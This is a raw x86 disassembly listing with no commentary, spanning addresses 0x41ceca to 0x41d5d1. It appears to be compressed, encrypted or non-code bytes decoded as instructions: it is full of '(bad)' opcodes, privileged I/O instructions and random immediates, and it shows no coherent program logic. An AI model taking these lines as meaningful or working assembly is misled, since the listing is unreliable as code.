  41ceca:	cmp    DWORD PTR [esi+0x5995a4b2],esi
  41ced0:	jmp    0x41ceb3
  41ced2:	pop    ss
  41ced3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ced4:	or     ecx,DWORD PTR [ebx+0x7b]
  41ced7:	movntq (bad),mm0
  41ced8:	out    0xc4,eax
  41ceda:	mov    ds:0x64fe62c8,eax
  41cedf:	loop   0x41cf08
  41cee1:	lahf   
  41cee2:	and    BYTE PTR [eax],dh
  41cee4:	jmp    0x41cee8
  41cee6:	int3   
  41cee7:	dec    ebp
  41cee8:	cmp    eax,0x3cef4b57
  41ceed:	or     DWORD PTR [ecx],eax
  41ceef:	jmp    0x41cedb
  41cef1:	adc    DWORD PTR [eax],edx
  41cef3:	add    al,0x93
  41cef5:	xor    al,0xce
  41cef7:	mov    edx,DWORD PTR [ecx]
  41cef9:	push   ds
  41cefa:	ss and ah,bh
  41cefd:	mov    ah,0xfc
  41ceff:	inc    esp
  41cf00:	or     ah,bl
  41cf02:	adc    ebp,DWORD PTR [esi]
  41cf04:	pop    esi
  41cf05:	addr16 xchg dh,cl
  41cf08:	xlat   BYTE PTR ds:[ebx]
  41cf09:	(bad)  
  41cf0a:	nop
  41cf0b:	push   ds
  41cf0c:	or     eax,0xeda3fd71
  41cf11:	pop    eax
  41cf12:	jp     0x41cec8
  41cf14:	jmp    0xa924:0x5bb5b1b1
  41cf1b:	push   ebx
  41cf1c:	inc    DWORD PTR [edi-0x43]
  41cf1f:	daa    
  41cf20:	and    bl,bh
  41cf22:	adc    DWORD PTR [ecx-0x31],esp
  41cf25:	je     0x41cf6c
  41cf27:	(bad)  
  41cf28:	stc    
  41cf29:	pop    ebp
  41cf2a:	hlt    
  41cf2b:	fcomi  st,st(3)
  41cf2d:	cmp    DWORD PTR [edi+eax*2-0x6b8362e1],ebp
  41cf34:	mov    esp,0x94cbc2b1
  41cf39:	xchg   ebx,eax
  41cf3a:	pop    eax
  41cf3b:	rcr    DWORD PTR [edi-0x50],1
  41cf3e:	pop    esp
  41cf3f:	sti    
  41cf40:	cmp    DWORD PTR [ecx],edi
  41cf42:	std    
  41cf43:	dec    esi
  41cf44:	pushf  
  41cf45:	imul   BYTE PTR [eax+0x4417002f]
  41cf4b:	cwde   
  41cf4c:	push   eax
  41cf4d:	fcomp  QWORD PTR [ebp+0x6c]
  41cf50:	and    BYTE PTR [ebp+0x16],dh
  41cf53:	in     al,dx
  41cf54:	xor    eax,DWORD PTR [edi+0x1ce32cc4]
  41cf5a:	push   es
  41cf5b:	(bad)  
  41cf5c:	into   
  41cf5d:	adc    al,0x40
  41cf5f:	jge    0x41cf7c
  41cf61:	sbb    eax,0x39463ba1
  41cf66:	je     0x41cf2f
  41cf68:	cmp    edx,eax
  41cf6a:	mov    BYTE PTR [esi-0x12],ah
  41cf6d:	pop    edi
  41cf6e:	adc    ah,ch
  41cf70:	sbb    eax,0x3dedfd15
  41cf75:	add    BYTE PTR [ebx+edx*2],bh
  41cf78:	(bad)  
  41cf7a:	test   al,cl
  41cf7c:	(bad)  
  41cf7d:	imul   BYTE PTR [ebp-0x1f389a49]
  41cf83:	sub    esi,esp
  41cf85:	jg     0x41cf3b
  41cf87:	ret    0xa26f
  41cf8a:	fmul   QWORD PTR [esi-0x63d0b25e]
  41cf90:	popf   
  41cf91:	fist   WORD PTR [ecx-0x6d]
  41cf94:	jbe    0x41cf77
  41cf96:	inc    edx
  41cf97:	sbb    al,0x6d
  41cf99:	push   esp
  41cf9a:	std    
  41cf9b:	mov    ch,dl
  41cf9d:	cmp    al,0xb5
  41cf9f:	leave  
  41cfa0:	and    al,0x26
  41cfa2:	sbb    DWORD PTR [edi+ecx*1+0x11ccfd91],ecx
  41cfa9:	(bad)  
  41cfaa:	out    dx,eax
  41cfab:	add    esi,DWORD PTR [ecx+0x56]
  41cfae:	scas   al,BYTE PTR es:[edi]
  41cfaf:	adc    al,0xd9
  41cfb1:	and    al,0x1d
  41cfb3:	xchg   edi,eax
  41cfb4:	mov    ds:0x25270aca,eax
  41cfb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cfba:	scas   al,BYTE PTR es:[edi]
  41cfbb:	dec    eax
  41cfbc:	inc    esp
  41cfbd:	lods   eax,DWORD PTR ds:[esi]
  41cfbe:	mov    WORD PTR ds:0x45fce5a4,fs
  41cfc4:	pop    esp
  41cfc5:	jns    0x41cfae
  41cfc7:	adc    BYTE PTR ds:0x4ac83263,0x4
  41cfce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cfcf:	fldcw  WORD PTR [edx-0x1428f9ca]
  41cfd5:	pop    esi
  41cfd6:	pop    edx
  41cfd7:	bswap  ebx
  41cfd9:	(bad)  
  41cfda:	arpl   bp,di
  41cfdc:	ja     0x41d015
  41cfde:	icebp  
  41cfdf:	(bad)  
  41cfe0:	out    0x48,al
  41cfe2:	fisttp DWORD PTR [eax+edx*4]
  41cfe5:	mov    dl,0xab
  41cfe7:	iret   
  41cfe8:	jmp    0x41cfb8
  41cfea:	ret    0x9601
  41cfed:	or     esi,DWORD PTR [esi+0x32]
  41cff0:	dec    edi
  41cff1:	fild   WORD PTR [edx]
  41cff3:	js     0x41d017
  41cff5:	add    eax,0xaba6498c
  41cffa:	cld    
  41cffb:	(bad)  
  41cffc:	sub    al,0xeb
  41cffe:	mov    ds:0xe59a559f,eax
  41d003:	popf   
  41d004:	xor    ebp,eax
  41d006:	cs into 
  41d008:	push   esi
  41d009:	imul   esi,DWORD PTR [esi],0x6510a148
  41d00f:	xchg   esp,eax
  41d010:	rcr    DWORD PTR [esi-0x2],0xe3
  41d014:	pop    edx
  41d015:	cmp    edi,ecx
  41d017:	jmp    0x39e672f5
  41d01c:	mov    ebp,ecx
  41d01e:	dec    esi
  41d01f:	cmp    eax,0x628e9f96
  41d024:	daa    
  41d025:	test   eax,0xaeebd3c6
  41d02a:	les    eax,FWORD PTR [esi]
  41d02c:	add    BYTE PTR [esi],bl
  41d02e:	xor    al,al
  41d030:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d031:	fild   WORD PTR [ebx+0x725f75fb]
  41d037:	imul   DWORD PTR [ecx-0x5d2202c7]
  41d03d:	mov    ds:0xb0e131a9,eax
  41d042:	jns    0x41d00f
  41d044:	call   0xdbafddfe
  41d049:	dec    ebp
  41d04a:	mov    ch,0xef
  41d04c:	inc    eax
  41d04d:	push   ds
  41d04e:	out    0xbd,eax
  41d050:	mov    bl,BYTE PTR [edi+0x39]
  41d053:	int    0x58
  41d055:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d056:	fst    DWORD PTR [ebx-0x4aa82074]
  41d05c:	pop    ecx
  41d05d:	ins    BYTE PTR es:[edi],dx
  41d05e:	mov    WORD PTR [edi+0x27fd47f9],gs
  41d064:	fist   WORD PTR [ebx]
  41d066:	ror    dl,1
  41d068:	jg     0x41d0cd
  41d06a:	sbb    ecx,ebx
  41d06c:	in     al,dx
  41d06d:	jmp    FWORD PTR [edx-0x42bd6dc1]
  41d073:	inc    ebp
  41d074:	sbb    esp,DWORD PTR ds:0xe9d76efa
  41d07a:	jp     0x41d0e1
  41d07c:	sub    ebp,DWORD PTR [edx]
  41d07e:	inc    ecx
  41d07f:	mov    dl,0x82
  41d081:	ficom  WORD PTR [edx]
  41d083:	nop
  41d084:	add    cl,cl
  41d086:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d087:	mov    ebp,0xb6e653f3
  41d08c:	in     eax,dx
  41d08d:	push   esp
  41d08e:	aad    0x2f
  41d090:	icebp  
  41d091:	lahf   
  41d092:	test   al,0x54
  41d094:	fs ins DWORD PTR es:[edi],dx
  41d096:	mov    esp,0x2ce52c7
  41d09b:	xor    DWORD PTR [edx+0x2f],ebx
  41d09e:	adc    BYTE PTR [ecx],0x8d
  41d0a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d0a2:	fs mov ch,0xea
  41d0a5:	pusha  
  41d0a6:	mov    al,ds:0xce3341d5
  41d0ab:	dec    ebx
  41d0ac:	out    0x2f,al
  41d0ae:	jg     0x41d037
  41d0b0:	(bad)
  41d0b3:	test   BYTE PTR [edi+ebp*2+0x55],0x16
  41d0b8:	xchg   edx,eax
  41d0b9:	xchg   edx,eax
  41d0ba:	add    BYTE PTR [ecx+0x41],dl
  41d0bd:	push   es
  41d0be:	cmp    ebx,ebx
  41d0c0:	mov    edi,0x9197f117
  41d0c5:	fbld   TBYTE PTR [ecx]
  41d0c7:	or     BYTE PTR cs:[edi],0xd1
  41d0cb:	inc    esi
  41d0cc:	pop    eax
  41d0cd:	sar    ch,cl
  41d0cf:	dec    eax
  41d0d0:	(bad)  
  41d0d1:	fiadd  WORD PTR [eax]
  41d0d3:	adc    cl,BYTE PTR [ecx]
  41d0d5:	add    eax,0x39329a9d
  41d0da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d0db:	iret   
  41d0dc:	pop    ss
  41d0dd:	into   
  41d0de:	inc    edi
  41d0df:	mov    gs,ebx
  41d0e1:	stos   DWORD PTR es:[edi],eax
  41d0e2:	sbb    ebx,DWORD PTR [esi+ebx*8-0x3b]
  41d0e6:	cwde   
  41d0e7:	out    0xeb,eax
  41d0e9:	ss push edx
  41d0eb:	jp     0x41d121
  41d0ed:	std    
  41d0ee:	mul    edi
  41d0f0:	adc    bl,bh
  41d0f2:	sub    al,0xb0
  41d0f4:	pop    esi
  41d0f5:	add    al,0x54
  41d0f7:	and    DWORD PTR gs:[ecx],esi
  41d0fa:	loope  0x41d07c
  41d0fc:	push   esi
  41d0fd:	pop    edi
  41d0fe:	jmp    0x41d158
  41d100:	mov    esp,0xf743f9bd
  41d105:	xor    eax,0xfc76c85c
  41d10a:	sahf   
  41d10b:	test   al,0x8c
  41d10d:	stos   DWORD PTR es:[edi],eax
  41d10e:	iret   
  41d10f:	rcl    DWORD PTR [ebx],1
  41d111:	jmp    0x1a7f:0x9e95befc
  41d118:	cmp    BYTE PTR [ebp+0xf9fc81f],al
  41d11e:	sbb    ebx,DWORD PTR [esi+0x349e7ab7]
  41d124:	jmp    0x41d12f
  41d126:	js     0x41d14f
  41d128:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d129:	loope  0x41d10b
  41d12b:	pop    ds
  41d12c:	out    0x6,eax
  41d12e:	xor    edi,DWORD PTR [ecx-0x15]
  41d131:	inc    esp
  41d132:	push   0x8ee6a0c3
  41d137:	and    eax,0xf5fd309d
  41d13c:	push   esi
  41d13d:	or     eax,0x15bc9b75
  41d142:	pop    ebx
  41d143:	enter  0xcb8b,0x2b
  41d147:	imul   edi,DWORD PTR [eax-0x1c],0x4aebfa4b
  41d14e:	jns    0x41d17d
  41d150:	rol    DWORD PTR [ecx],1
  41d152:	pop    eax
  41d153:	push   ebp
  41d154:	push   ecx
  41d155:	dec    ecx
  41d156:	xchg   esp,eax
  41d157:	(bad)  
  41d158:	rol    bl,cl
  41d15a:	addr16 xbegin 0x75cd5360
  41d161:	stos   BYTE PTR es:[edi],al
  41d162:	cld    
  41d163:	and    bh,BYTE PTR [ecx+ebx*2]
  41d166:	lea    ecx,[ecx-0x37b2358a]
  41d16c:	and    BYTE PTR [ebx-0x4aa3b7f],dl
  41d172:	push   ebx
  41d173:	nop
  41d174:	jmp    0x41d136
  41d176:	cdq    
  41d177:	test   eax,0x7ca4134b
  41d17c:	xor    eax,ebp
  41d17e:	and    ecx,eax
  41d180:	jl     0x41d1d5
  41d182:	sbb    al,BYTE PTR ss:[edx]
  41d185:	popa   
  41d186:	out    dx,eax
  41d187:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d188:	pop    ebx
  41d189:	mov    BYTE PTR [ecx],al
  41d18b:	cmp    BYTE PTR [ebx-0x67b79bb0],cl
  41d191:	inc    ebp
  41d192:	gs jp  0x41d212
  41d195:	popa   
  41d196:	xchg   ebp,eax
  41d197:	enter  0xa6d0,0xf4
  41d19b:	lods   eax,DWORD PTR ds:[esi]
  41d19c:	sub    ah,BYTE PTR [edx-0x23147b3c]
  41d1a2:	add    dh,bl
  41d1a4:	or     bh,BYTE PTR [edx+0x6b]
  41d1a7:	mov    bl,0x41
  41d1a9:	aam    0xb9
  41d1ab:	or     al,0xaf
  41d1ad:	sar    esp,1
  41d1af:	mov    ch,0x60
  41d1b1:	xchg   ebp,eax
  41d1b2:	inc    ecx
  41d1b3:	jl     0x41d1a1
  41d1b5:	pop    ecx
  41d1b6:	push   ss
  41d1b7:	push   es
  41d1b8:	loopne 0x41d21b
  41d1ba:	sar    DWORD PTR [edi-0x37f562e9],cl
  41d1c0:	mov    ebp,ecx
  41d1c2:	jmp    DWORD PTR [eax]
  41d1c4:	dec    edi
  41d1c5:	pop    ebp
  41d1c6:	and    BYTE PTR [edx],bh
  41d1c8:	jmp    0x41d194
  41d1ca:	lods   eax,DWORD PTR ds:[esi]
  41d1cb:	push   ecx
  41d1cc:	sub    eax,0xd785dfb8
  41d1d1:	fldlg2 
  41d1d3:	dec    esi
  41d1d4:	jp     0x41d186
  41d1d6:	push   ebx
  41d1d7:	adc    DWORD PTR [esi+edi*4],ebp
  41d1da:	add    DWORD PTR [ecx+0x46],0xffffffcf
  41d1de:	imul   eax,DWORD PTR [edx-0x14],0xffffffe2
  41d1e2:	aad    0xd0
  41d1e4:	pushf  
  41d1e5:	mov    WORD PTR [edi-0x37],ss
  41d1e8:	fistp  DWORD PTR [edx+ebp*1+0x71567ecb]
  41d1ef:	fmulp  st(6),st
  41d1f1:	jns    0x41d260
  41d1f3:	and    BYTE PTR [esi-0x40],0xff
  41d1f7:	jae    0x41d18a
  41d1f9:	xor    al,0x31
  41d1fb:	xchg   esp,eax
  41d1fc:	xchg   edx,eax
  41d1fd:	outs   dx,DWORD PTR ds:[esi]
  41d1fe:	xor    al,0x1a
  41d200:	and    bl,bh
  41d202:	sub    ebx,DWORD PTR [eax-0x46]
  41d205:	jbe    0x41d188
  41d207:	inc    esi
  41d208:	lds    esp,FWORD PTR [ebp-0x37b37604]
  41d20e:	sub    DWORD PTR [ecx-0x379878bb],ecx
  41d214:	lock sbb DWORD PTR [esi],esp
  41d217:	stos   DWORD PTR es:[edi],eax
  41d218:	nop
  41d219:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d21a:	jo     0x41d289
  41d21c:	jmp    0x41d23c
  41d21e:	aad    0xe5
  41d220:	adc    eax,0xae613d6f
  41d225:	or     dh,bl
  41d227:	pop    ds
  41d228:	pop    esi
  41d229:	sbb    al,0xaa
  41d22b:	enter  0x8029,0x2e
  41d22f:	ja     0x41d1ba
  41d231:	(bad)
  41d235:	gs ins BYTE PTR es:[edi],dx
  41d237:	mov    ds:0x133ad84d,al
  41d23c:	jg     0x41d228
  41d23e:	push   ebp
  41d23f:	xor    al,0x92
  41d241:	or     bh,dl
  41d243:	sub    DWORD PTR [esi+0x3fcabb72],edi
  41d249:	mov    esi,DWORD PTR [esi-0xf]
  41d24c:	sub    ebp,DWORD PTR [eax]
  41d24e:	push   cs
  41d24f:	(bad)  
  41d250:	adc    ebx,ecx
  41d252:	sti    
  41d253:	(bad)
  41d258:	pop    ebx
  41d259:	sub    dl,bh
  41d25b:	test   al,0x21
  41d25d:	ffreep st(3)
  41d25f:	adc    bh,BYTE PTR [edx-0x56]
  41d262:	fwait
  41d263:	jle    0x41d266
  41d265:	out    dx,al
  41d266:	cld    
  41d267:	sbb    dl,bh
  41d269:	dec    esi
  41d26a:	pop    ebp
  41d26b:	dec    edi
  41d26c:	mov    cl,0xbc
  41d26e:	inc    edi
  41d26f:	leave  
  41d270:	int3   
  41d271:	outs   dx,BYTE PTR ds:[esi]
  41d272:	jmp    0xcd8:0xc7d158a8
  41d279:	mov    bh,0x3
  41d27b:	inc    esi
  41d27c:	jno    0x41d233
  41d27e:	out    0x47,al
  41d280:	cmc    
  41d281:	cmp    al,0xda
  41d283:	xchg   edi,eax
  41d284:	or     al,0x16
  41d286:	jns    0x41d250
  41d288:	sbb    al,BYTE PTR [edx+edi*2+0x757e636b]
  41d28f:	daa    
  41d290:	jmp    0x41d2ae
  41d292:	ins    DWORD PTR es:[edi],dx
  41d293:	icebp  
  41d294:	jle    0x41d305
  41d296:	es mov esi,0xc84ec854
  41d29c:	inc    ebp
  41d29d:	in     eax,0x3c
  41d29f:	(bad)  
  41d2a0:	mov    BYTE PTR ds:0x8feb8ecd,ch
  41d2a6:	out    dx,eax
  41d2a7:	scas   eax,DWORD PTR es:[edi]
  41d2a8:	or     ebp,DWORD PTR [edx-0x21383b35]
  41d2ae:	in     al,dx
  41d2af:	sub    DWORD PTR [ebp+esi*2-0xa],esp
  41d2b3:	add    esp,DWORD PTR [esi-0x71698308]
  41d2b9:	push   esi
  41d2ba:	sbb    DWORD PTR [eax+ebp*8-0x181e5635],edx
  41d2c1:	(bad)  
  41d2c2:	cld    
  41d2c3:	daa    
  41d2c4:	xorps  xmm0,XMMWORD PTR [eax+0x5e]
  41d2c8:	mov    ah,0x80
  41d2ca:	add    ebx,DWORD PTR [esi]
  41d2cc:	xchg   ebx,eax
  41d2cd:	ret    
  41d2ce:	bound  eax,QWORD PTR [edi+esi*8+0x23]
  41d2d2:	jecxz  0x41d34e
  41d2d4:	sub    al,0x6f
  41d2d6:	mov    eax,0xed4f1e98
  41d2db:	call   0x94f7b2b5
  41d2e0:	imul   esp,ebx,0x7f
  41d2e3:	mov    esi,DWORD PTR [ecx-0x4745030f]
  41d2e9:	inc    esp
  41d2ea:	ins    BYTE PTR es:[edi],dx
  41d2eb:	add    BYTE PTR [esi-0x71],0x53
  41d2ef:	xchg   edi,eax
  41d2f0:	dec    edi
  41d2f1:	addr16 xchg esp,eax
  41d2f3:	iret   
  41d2f4:	pusha  
  41d2f5:	mov    ch,0x1e
  41d2f7:	rol    BYTE PTR [esi-0x42],cl
  41d2fa:	jl     0x41d2cb
  41d2fc:	sub    edx,edx
  41d2fe:	(bad)  
  41d2ff:	je     0x41d2f3
  41d301:	test   ebp,edi
  41d303:	xor    al,0x31
  41d305:	fimul  DWORD PTR [ecx+0x21]
  41d308:	stos   DWORD PTR es:[edi],eax
  41d309:	mov    ebp,0xa073be4c
  41d30e:	sbb    BYTE PTR [edx],dl
  41d310:	mov    ch,0x35
  41d312:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d313:	(bad)  [ebx+0x3f]
  41d316:	cmp    BYTE PTR [edi],ah
  41d318:	call   0xeb7b8ae9
  41d31d:	popa   
  41d31e:	ret    
  41d31f:	das    
  41d320:	pop    ebp
  41d321:	xchg   edx,eax
  41d322:	loope  0x41d37a
  41d324:	into   
  41d325:	(bad)  
  41d327:	cmc    
  41d328:	iret   
  41d329:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d32a:	stos   BYTE PTR es:[edi],al
  41d32b:	dec    ebp
  41d32c:	fcom   QWORD PTR [ebx-0x40]
  41d32f:	pop    ds
  41d330:	in     al,dx
  41d331:	iret   
  41d332:	pop    ds
  41d333:	aaa    
  41d334:	xchg   esp,eax
  41d335:	add    esi,DWORD PTR [ecx+0x2a]
  41d338:	or     edi,eax
  41d33a:	sti    
  41d33b:	mov    esi,0x8818e5e2
  41d340:	sub    cl,dl
  41d342:	or     ebx,0x70fd39d5
  41d348:	repnz popa 
  41d34a:	xlat   BYTE PTR ds:[ebx]
  41d34b:	loopne 0x41d351
  41d34d:	dec    edx
  41d34e:	mov    ebp,0xae1bc1c8
  41d353:	clc    
  41d354:	(bad)  
  41d355:	nop
  41d356:	fisttp DWORD PTR [ebx-0x15]
  41d359:	sbb    ecx,ebp
  41d35b:	mov    ecx,ecx
  41d35d:	cmc    
  41d35e:	stc    
  41d35f:	pop    edi
  41d360:	pop    ebp
  41d361:	fistp  QWORD PTR [edx+edx*8-0x64]
  41d365:	push   0x635980b9
  41d36a:	std    
  41d36b:	ficom  WORD PTR es:[edi]
  41d36e:	mov    al,0xda
  41d370:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d371:	xor    al,0x2c
  41d373:	and    al,0x4a
  41d375:	add    ecx,ecx
  41d377:	pop    esp
  41d378:	jp     0x41d358
  41d37a:	pop    esi
  41d37b:	stc    
  41d37c:	jns    0x41d328
  41d37e:	jmp    0xfd738a8a
  41d383:	fmul   QWORD PTR [edi+0x42b9f044]
  41d389:	int    0x53
  41d38b:	enter  0x22d5,0x0
  41d38f:	xchg   edi,eax
  41d390:	cmp    al,0xd7
  41d392:	pop    es
  41d393:	cmp    eax,0x6c3945eb
  41d398:	pusha  
  41d399:	or     BYTE PTR ds:0x91dffbf4,ch
  41d39f:	outs   dx,BYTE PTR ds:[esi]
  41d3a0:	es lahf 
  41d3a2:	dec    edi
  41d3a3:	xchg   edi,eax
  41d3a4:	pop    ecx
  41d3a5:	push   es
  41d3a6:	inc    BYTE PTR [ecx]
  41d3a8:	arpl   WORD PTR [eax-0x71f46d1f],dx
  41d3ae:	mov    ch,0x9f
  41d3b0:	cmp    bl,bh
  41d3b2:	ss jmp 0x61d8dc03
  41d3b8:	sub    ebp,esi
  41d3ba:	cld    
  41d3bb:	fldenv [ebx-0x3ca5469f]
  41d3c1:	add    bl,BYTE PTR [ebx]
  41d3c3:	enter  0x636,0xb4
  41d3c7:	pop    ecx
  41d3c8:	xor    eax,0xea9f82f6
  41d3cd:	xchg   DWORD PTR [edx],eax
  41d3cf:	into   
  41d3d0:	popa   
  41d3d1:	imul   ecx,DWORD PTR [ebx-0x8],0xffffffee
  41d3d5:	push   esi
  41d3d6:	push   ss
  41d3d7:	enter  0x4031,0xbf
  41d3db:	xlat   BYTE PTR cs:[ebx]
  41d3dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d3de:	test   BYTE PTR [esi-0x51],cl
  41d3e1:	into   
  41d3e2:	mov    bh,0xc9
  41d3e4:	daa    
  41d3e5:	and    bh,cl
  41d3e7:	sbb    DWORD PTR [edx-0x13ece257],esi
  41d3ed:	daa    
  41d3ee:	dec    edx
  41d3ef:	pop    edx
  41d3f0:	stos   DWORD PTR es:[edi],eax
  41d3f1:	es xor al,0x97
  41d3f4:	lods   al,BYTE PTR ds:[esi]
  41d3f5:	in     eax,dx
  41d3f6:	mov    DWORD PTR [edi+0x53],edi
  41d3f9:	fistp  WORD PTR [edx-0x3d]
  41d3fc:	sub    eax,0xfddeeb96
  41d401:	ins    BYTE PTR es:[edi],dx
  41d402:	cmp    ch,BYTE PTR [esi+0x6b]
  41d405:	scas   al,BYTE PTR es:[edi]
  41d406:	sbb    eax,0xe1d45029
  41d40b:	retf   0xcbc6
  41d40e:	mov    ds:0x94b8a948,eax
  41d413:	pop    ebp
  41d414:	das    
  41d415:	sar    ah,cl
  41d417:	xor    eax,0xd5a4fa33
  41d41c:	xlat   BYTE PTR ds:[ebx]
  41d41d:	mov    al,ds:0xae52c85f
  41d422:	scas   al,BYTE PTR es:[edi]
  41d423:	aas    
  41d424:	pop    es
  41d425:	cmp    eax,0x9fea586e
  41d42a:	xchg   esi,eax
  41d42b:	push   edx
  41d42c:	xor    DWORD PTR [ebx],esi
  41d42e:	fadd   QWORD PTR [edx+0x4b]
  41d431:	daa    
  41d432:	inc    edi
  41d433:	jae    0x41d3ca
  41d435:	inc    edi
  41d436:	test   al,0xc8
  41d438:	gs jb  0x41d425
  41d43b:	mov    bl,0xfe
  41d43d:	out    0xaa,eax
  41d43f:	fsubp  st(3),st
  41d441:	sbb    ebx,ecx
  41d443:	cld    
  41d444:	push   0xf
  41d446:	ja     0x41d4b0
  41d448:	(bad)  
  41d44a:	jne    0x41d4be
  41d44c:	cs scas al,BYTE PTR es:[edi]
  41d44e:	fisttp WORD PTR [edx+0x6d]
  41d451:	(bad)  
  41d452:	fs ins DWORD PTR es:[edi],dx
  41d454:	adc    al,0xb3
  41d456:	cld    
  41d457:	loopne 0x41d4b6
  41d459:	imul   esi,DWORD PTR [ebp-0x45dfb532],0xb84563c8
  41d463:	ret    0x3c5a
  41d466:	fstp   QWORD PTR [ebx-0x15]
  41d469:	jbe    0x41d491
  41d46b:	popa   
  41d46c:	imul   esp,edi,0xffffffed
  41d46f:	mov    ds:0x4ad20439,eax
  41d474:	push   0x24
  41d476:	icebp  
  41d477:	lds    eax,FWORD PTR [ebp+0x5]
  41d47a:	lds    esi,FWORD PTR [esi+0xcfd4197]
  41d480:	push   es
  41d481:	jae    0x41d48c
  41d483:	ffree  st(0)
  41d485:	fcom   DWORD PTR [esi]
  41d487:	pusha  
  41d488:	neg    bh
  41d48a:	cmp    BYTE PTR [ecx+0x5c],0x15
  41d48e:	adc    BYTE PTR [eax],cl
  41d490:	hlt    
  41d491:	inc    esi
  41d492:	cld    
  41d493:	jnp    0x41d419
  41d495:	addr16 mov edx,0xe2f8ab7b
  41d49b:	jecxz  0x41d489
  41d49d:	dec    ecx
  41d49e:	scas   eax,DWORD PTR es:[edi]
  41d49f:	pushf  
  41d4a0:	(bad)  [bx+si-0x39]
  41d4a4:	loope  0x41d4e8
  41d4a6:	popf   
  41d4a7:	pop    es
  41d4a8:	push   es
  41d4a9:	or     ebx,DWORD PTR [esi+0x71]
  41d4ac:	push   ds
  41d4ad:	pushf  
  41d4ae:	jp     0x41d4df
  41d4b0:	je     0x41d4a7
  41d4b2:	sbb    BYTE PTR [edx+ecx*4],ah
  41d4b5:	jno    0x41d4ba
  41d4b7:	cmp    esi,ebx
  41d4b9:	mov    BYTE PTR [esi-0x455d1641],bh
  41d4bf:	sbb    al,0xd1
  41d4c1:	pop    edi
  41d4c2:	inc    ebp
  41d4c3:	push   cs
  41d4c4:	clc    
  41d4c5:	adc    eax,0x5aab21fd
  41d4ca:	mov    ebp,0x2406cd8a
  41d4cf:	retf   
  41d4d0:	enter  0x7137,0x86
  41d4d4:	icebp  
  41d4d5:	int3   
  41d4d6:	les    ebx,FWORD PTR [edi]
  41d4d8:	push   esi
  41d4d9:	jmp    0x41d4d7
  41d4db:	lahf   
  41d4dc:	aad    0xcd
  41d4de:	push   ebp
  41d4df:	sbb    al,0xcc
  41d4e1:	xor    DWORD PTR [ebp+0x6d0cfc8],edx
  41d4e7:	lea    ecx,[edi-0x47]
  41d4ea:	(bad)  [ecx+edx*1+0x1984fcfa]
  41d4f1:	push   ecx
  41d4f2:	adc    BYTE PTR [edi+eiz*1-0x6dd6a5b],al
  41d4f9:	fild   QWORD PTR [ecx+0x39]
  41d4fc:	je     0x41d499
  41d4fe:	push   esi
  41d4ff:	jg     0x41d4e4
  41d501:	out    0xfb,al
  41d503:	mov    eax,ds:0x83ebe557
  41d508:	imul   eax,ecx,0xc
  41d50b:	je     0x41d530
  41d50d:	fcom   DWORD PTR [edi+0x1c]
  41d510:	add    ebx,eax
  41d512:	mov    esp,0xd4b897b7
  41d517:	and    ebp,ebx
  41d519:	mov    eax,ds:0xdcfee5aa
  41d51e:	arpl   WORD PTR [esi+0x1b],si
  41d521:	push   ecx
  41d522:	push   cs
  41d523:	enter  0xb755,0x72
  41d527:	repnz es push ds
  41d52a:	cmp    dl,BYTE PTR [ebx]
  41d52c:	or     esi,edx
  41d52e:	add    al,BYTE PTR [eax]
  41d530:	xor    al,0x9b
  41d532:	jl     0x41d511
  41d534:	mov    al,BYTE PTR [ebx]
  41d536:	idiv   ebx
  41d538:	adc    ecx,DWORD PTR [ebx+0x5e]
  41d53b:	enter  0xe831,0x8
  41d53f:	cwde   
  41d540:	rcl    BYTE PTR [edx+0x18],cl
  41d543:	mov    dh,0xdd
  41d545:	idiv   DWORD PTR [eax+ecx*8]
  41d548:	std    
  41d549:	js     0x41d4fc
  41d54b:	sub    eax,0xc9981648
  41d550:	cmp    al,0xac
  41d552:	xlat   BYTE PTR ds:[ebx]
  41d553:	add    BYTE PTR [ebp-0x24f013bf],ah
  41d559:	dec    esp
  41d55a:	popf   
  41d55b:	adc    eax,0xba3df5ea
  41d560:	les    ecx,FWORD PTR [edx+esi*1-0x61096b08]
  41d567:	enter  0xc75e,0x82
  41d56b:	es dec eax
  41d56d:	inc    esi
  41d56e:	add    DWORD PTR [esi],edx
  41d570:	pop    es
  41d571:	outs   dx,DWORD PTR ds:[esi]
  41d572:	std    
  41d573:	in     al,dx
  41d574:	call   0x9aa:0x28bd5d9a
  41d57b:	enter  0x361f,0xeb
  41d57f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d580:	test   bh,0x2d
  41d583:	fldpi  
  41d585:	mov    ch,0x66
  41d587:	shr    BYTE PTR [ecx+0x71],cl
  41d58a:	shr    DWORD PTR [esp+ebx*1-0x69],cl
  41d58e:	xchg   esp,eax
  41d58f:	xchg   esp,eax
  41d590:	jmp    0x41d5ec
  41d592:	or     BYTE PTR [eax+0x57ab2d43],ch
  41d598:	int    0x4c
  41d59a:	divps  xmm5,xmm3
  41d59d:	test   BYTE PTR [ecx+0x224cdd1],cl
  41d5a3:	enter  0x3d97,0x65
  41d5a7:	cli    
  41d5a8:	out    dx,al
  41d5a9:	inc    edi
  41d5aa:	jb     0x41d566
  41d5ac:	mov    eax,ds:0x8411fd7b
  41d5b1:	outs   dx,DWORD PTR ds:[esi]
  41d5b2:	mov    edx,0xc47d3474
  41d5b7:	fwait
  41d5b8:	add    eax,esp
  41d5ba:	xchg   bh,dl
  41d5bc:	xor    edi,ebx
  41d5be:	inc    ecx
  41d5bf:	call   0x9e378cd3
  41d5c4:	je     0x41d54b
  41d5c6:	sbb    al,BYTE PTR [edi-0x7e]
  41d5c9:	pop    bp
  41d5cb:	xor    eax,0xc9a2f78b
  41d5d0:	push   edx
  41d5d1:	xor    BYTE PTR [esi+eiz*1+0x30c91211],dl
